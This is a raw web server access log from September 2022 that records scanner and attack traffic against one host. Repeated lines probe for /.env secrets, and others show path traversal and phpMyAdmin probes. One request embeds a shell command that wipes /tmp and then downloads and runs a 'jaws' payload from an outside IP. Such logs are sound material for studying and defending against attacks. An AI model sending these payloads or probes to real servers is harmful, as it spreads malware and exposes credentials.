90.151.171.106 - - [11/Sep/2022:23:18:46 +0000] "-" 408 - "-" "-"
135.125.246.189 - - [11/Sep/2022:23:25:08 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [11/Sep/2022:23:25:08 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.34.56.97 - - [12/Sep/2022:00:03:49 +0000] "GET / HTTP/1.1" 200 32 "http://35.178.166.217:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
202.124.227.142 - - [12/Sep/2022:00:04:23 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:00:14:56 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:00:14:56 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
80.94.92.239 - - [12/Sep/2022:00:29:14 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.235.205 - - [12/Sep/2022:01:45:18 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:01:45:18 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [12/Sep/2022:02:03:34 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [12/Sep/2022:02:03:34 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
62.171.182.70 - - [12/Sep/2022:02:07:36 +0000] "HEAD / HTTP/1.1" 200 - "-" "-"
95.161.131.235 - - [12/Sep/2022:03:08:31 +0000] "GET /../../mnt/mtd/Config/Account1 HTTP/1.1" 400 226 "-" "Mozilla/5.0 zgrab/0.x"
35.195.93.98 - - [12/Sep/2022:03:11:10 +0000] "GET / HTTP/1.1" 200 32 "-" "python-requests/2.28.1"
95.214.235.205 - - [12/Sep/2022:03:15:23 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:03:15:28 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
168.232.15.102 - - [12/Sep/2022:03:32:25 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
135.125.246.189 - - [12/Sep/2022:03:35:37 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [12/Sep/2022:03:35:37 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:04:44:44 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:04:44:44 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
74.82.47.4 - - [12/Sep/2022:04:59:19 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
135.125.246.189 - - [12/Sep/2022:04:59:32 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [12/Sep/2022:04:59:32 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
74.82.47.4 - - [12/Sep/2022:05:04:13 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0"
135.125.246.189 - - [12/Sep/2022:05:46:00 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [12/Sep/2022:05:46:00 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
88.214.43.215 - - [12/Sep/2022:06:10:43 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
88.214.43.215 - - [12/Sep/2022:06:10:44 +0000] "\x16\x03\x01\x01H\x01" 400 226 "-" "-"
95.214.235.205 - - [12/Sep/2022:06:15:01 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:06:15:01 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
40.87.17.51 - - [12/Sep/2022:06:21:36 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
40.87.17.51 - - [12/Sep/2022:06:21:40 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
40.87.17.51 - - [12/Sep/2022:06:21:41 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
135.125.217.54 - - [12/Sep/2022:06:43:58 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [12/Sep/2022:06:43:58 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.210.31.9 - - [12/Sep/2022:07:10:55 +0000] "GET / HTTP/1.1" 200 32 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
40.87.17.51 - - [12/Sep/2022:07:23:45 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
40.87.17.51 - - [12/Sep/2022:07:23:45 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
71.6.232.7 - - [12/Sep/2022:07:37:23 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
192.241.205.211 - - [12/Sep/2022:07:44:27 +0000] "GET /ReportServer HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
95.214.235.205 - - [12/Sep/2022:07:44:54 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:07:44:54 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [12/Sep/2022:08:18:15 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [12/Sep/2022:08:18:15 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:09:15:07 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:09:15:08 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
162.62.191.231 - - [12/Sep/2022:09:38:12 +0000] "GET / HTTP/1.1" 200 32 "-" "curl/7.64.1"
209.141.36.112 - - [12/Sep/2022:09:38:24 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
209.141.36.112 - - [12/Sep/2022:09:38:24 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
209.141.36.231 - - [12/Sep/2022:09:38:37 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
209.141.36.231 - - [12/Sep/2022:09:38:38 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
135.125.217.54 - - [12/Sep/2022:10:07:07 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [12/Sep/2022:10:07:07 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
27.150.190.96 - - [12/Sep/2022:10:22:23 +0000] "GET http://35.178.166.217:80/mysql/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
27.150.190.96 - - [12/Sep/2022:10:22:23 +0000] "GET http://35.178.166.217:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
27.150.190.96 - - [12/Sep/2022:10:22:23 +0000] "GET http://35.178.166.217:80/pma/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
95.214.235.205 - - [12/Sep/2022:10:44:19 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:10:44:20 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
80.94.92.239 - - [12/Sep/2022:10:48:47 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
135.125.217.54 - - [12/Sep/2022:11:19:09 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [12/Sep/2022:11:19:09 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [12/Sep/2022:12:04:39 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [12/Sep/2022:12:04:39 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:12:13:49 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:12:13:49 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
90.151.171.106 - - [12/Sep/2022:12:40:47 +0000] "CONNECT host64.ru:443 HTTP/1.1" 405 224 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [12/Sep/2022:12:40:57 +0000] "GET http://host64.ru/rb/getip.php?Z71860198950Q1 HTTP/1.1" 404 196 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [12/Sep/2022:12:41:12 +0000] "-" 408 - "-" "-"
167.94.145.58 - - [12/Sep/2022:13:03:52 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
167.94.145.58 - - [12/Sep/2022:13:03:52 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.58 - - [12/Sep/2022:13:03:52 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
128.14.133.58 - - [12/Sep/2022:13:17:11 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:13:43:32 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:13:43:33 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [12/Sep/2022:14:04:28 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [12/Sep/2022:14:04:28 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:15:15:08 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:15:15:08 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [12/Sep/2022:15:46:30 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [12/Sep/2022:15:46:30 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.221.22 - - [12/Sep/2022:16:11:17 +0000] "GET /manager/text/list HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
80.94.92.239 - - [12/Sep/2022:16:31:13 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
192.241.194.137 - - [12/Sep/2022:16:38:20 +0000] "MGLNDD_35.178.166.217_80\n" 400 226 "-" "-"
95.214.235.205 - - [12/Sep/2022:16:43:35 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:16:43:36 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
90.151.171.106 - - [12/Sep/2022:16:50:05 +0000] "CONNECT ip.bablosoft.com:443 HTTP/1.1" 405 224 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [12/Sep/2022:16:50:19 +0000] "GET http://ip.bablosoft.com/?Z71860198950Q1 HTTP/1.1" 200 32 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
135.125.217.54 - - [12/Sep/2022:17:01:03 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [12/Sep/2022:17:01:03 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
114.225.124.120 - - [12/Sep/2022:17:15:58 +0000] "POST /HNAP1/ HTTP/1.0" 400 226 "-" "-"
95.214.235.205 - - [12/Sep/2022:18:13:47 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:18:13:47 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
92.118.39.30 - - [12/Sep/2022:18:24:28 +0000] "GET http://example.com/ HTTP/1.1" 200 32 "-" "Go-http-client/1.1"
135.125.217.54 - - [12/Sep/2022:18:34:58 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [12/Sep/2022:18:34:58 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
70.177.99.176 - - [12/Sep/2022:18:59:45 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.124.84.209/jaws;sh+/tmp/jaws HTTP/1.1" 404 196 "-" "Hello, world"
111.231.209.200 - - [12/Sep/2022:19:01:59 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
135.125.217.54 - - [12/Sep/2022:19:03:53 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [12/Sep/2022:19:03:53 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:19:44:01 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:19:44:01 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
62.171.182.70 - - [12/Sep/2022:19:54:56 +0000] "HEAD / HTTP/1.1" 200 - "-" "-"
185.180.143.72 - - [12/Sep/2022:19:56:37 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
59.36.168.250 - - [12/Sep/2022:20:07:54 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
59.36.168.250 - - [12/Sep/2022:20:07:56 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
195.178.120.159 - - [12/Sep/2022:20:56:31 +0000] "GET / HTTP/1.1" 200 32 "http://35.178.166.217:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
128.1.248.26 - - [12/Sep/2022:20:59:39 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:21:13:44 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [12/Sep/2022:21:13:44 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.129.61.2 - - [12/Sep/2022:21:19:20 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
185.220.101.168 - - [12/Sep/2022:21:19:36 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
134.209.195.166 - - [12/Sep/2022:21:19:36 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
135.125.217.54 - - [12/Sep/2022:21:22:25 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [12/Sep/2022:21:22:25 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
182.254.225.35 - - [12/Sep/2022:21:28:59 +0000] "GET http://35.178.166.217:80/mysql/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
182.254.225.35 - - [12/Sep/2022:21:28:59 +0000] "GET http://35.178.166.217:80/pma/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
182.254.225.35 - - [12/Sep/2022:21:28:59 +0000] "GET http://35.178.166.217:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
182.254.225.35 - - [12/Sep/2022:21:28:59 +0000] "GET http://35.178.166.217:80/db/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
